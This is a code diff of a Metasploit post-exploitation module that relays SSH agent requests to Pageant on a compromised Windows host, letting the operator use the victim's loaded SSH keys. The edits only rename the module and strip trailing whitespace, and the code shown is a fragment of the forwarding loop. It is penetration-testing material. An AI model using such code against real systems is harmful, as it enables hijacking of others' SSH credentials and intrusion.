@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name'          => 'Forward SSH agent requests to Pageant',
+        'Name'          => 'Forward SSH Agent Requests To Remote Pageant',
         'Description'   => %q{
             This module forwards SSH agent requests from a local socket to a remote Pageant instance.
             If a target Windows machine is compromised and is running Pageant, this will allow the
@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Post
             loaded into the remote meterpreter session by this module if it is not already loaded.
           },
         'License'       => MSF_LICENSE,
-        'Author'        => [ 
+        'Author'        => [
             'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
         ],
         'Platform'      => [ 'win' ],
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Post
     if ::File.exists?(@sockpath)
         print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
         return false
-    end 
+    end
 
     # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
     ::UNIXServer.open(@sockpath) {|serv|
@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Post
       print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
       print_status("Now use any tool normally (e.g. ssh-add)")
 
-      loop { 
+      loop {
         s = serv.accept
         loop {
           socket_request_data = s.recvfrom(8192)
@@ -79,14 +79,14 @@ class Metasploit3 < Msf::Post
           vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
           response = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
           if response[:success]
-            s.send response[:blob],0 
+            s.send response[:blob],0
             vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{response[:error]}')")
           else
             print_error("PageantJacker: Unsuccessful response received (#{response[:error]})")
           end
-        }   
-      }   
-    }   
+        }
+      }
+    }
 
   end
 
